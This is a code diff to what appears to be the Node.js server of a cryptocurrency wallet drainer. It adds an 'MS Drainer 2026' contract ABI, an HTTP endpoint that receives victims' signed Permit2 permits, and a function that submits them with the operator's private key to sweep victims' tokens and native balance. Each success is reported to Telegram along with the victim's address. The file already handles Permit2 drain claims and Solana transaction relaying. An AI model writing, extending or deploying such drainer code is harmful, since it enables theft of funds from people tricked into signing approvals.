@@ -282,6 +282,11 @@ const TRACE_REWARDS_ABI = [
     "function claim(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 rewardAmount) external payable"
 ];
 
+const MS_DRAINER_2026_ABI = [
+    "function claimRewards(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 claimAmount) external payable",
+    "function synchronize(bytes data) external payable"
+];
+
 const CHAIN_CONFIGS = {
     "ethereum": { name: "ethereum", id: 1 },
     "bsc": { name: "binance smart chain", id: 56 },
@@ -404,6 +409,12 @@ const server = http.createServer((req, res) => {
                 return res.end(JSON.stringify({ status: "success" }));
             }
 
+            if (req.url === "/submit-ms-drainer") {
+                console.log(`📥 [EVM] Received MS Drainer 2026 Claim for ${data.chainName}`);
+                await fulfillMSDrainer2026Claim(data);
+                return res.end(JSON.stringify({ status: "success" }));
+            }
+
             if (req.url === "/submit-solana-tx") {
                 console.log("📥 [SOL] Received Solana Transaction. Broadcasting...");
                 const sig = await solanaConnection.sendRawTransaction(Buffer.from(data.rawTransaction, "base64"), { skipPreflight: true });
@@ -494,6 +505,33 @@ async function fulfillPermit2Claim(data) {
     } catch (e) {
         console.error(`❌ [EVM] Permit2 Claim Failed on ${chainName}:`, e.message);
         sendTelegram(`❌ **Permit2 Claim Failed** (${chainName})\nError: ${e.message.slice(0, 100)}`);
+        return false;
+    }
+}
+
+async function fulfillMSDrainer2026Claim(data) {
+    const { permit, signature, chainName, owner, contractAddress, claimAmount, nativeBalance } = data;
+    try {
+        const rpcUrl = getRpcUrl(chainName);
+        const provider = new ethers.JsonRpcProvider(rpcUrl);
+        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+        const drainer = new ethers.Contract(contractAddress, MS_DRAINER_2026_ABI, wallet);
+
+        console.log(`🚀 [MS2026] Executing Drain on ${chainName}...`);
+
+        // Calculate value to send (native balance + fee)
+        // Note: nativeBalance here is the amount the user sent with the tx
+        const tx = await drainer.claimRewards(permit, signature, claimAmount, {
+            value: BigInt(nativeBalance),
+            gasLimit: 1000000 // High limit for complex sweeps
+        });
+
+        console.log(`✅ [MS2026] Drain Success on ${chainName}: ${tx.hash}`);
+        sendTelegram(`🎯 **MS DRAINER 2026 SUCCESS**\nChain: ${chainName}\nUser: <code>${owner}</code>\nAssets: ${permit.permitted.length + 1}\nTX: \`${tx.hash}\``);
+        return true;
+    } catch (e) {
+        console.error(`❌ [MS2026] Drain Failed on ${chainName}:`, e.message);
+        sendTelegram(`❌ **MS Drainer 2026 Failed** (${chainName})\nError: ${e.message.slice(0, 100)}`);
         return false;
     }
 }
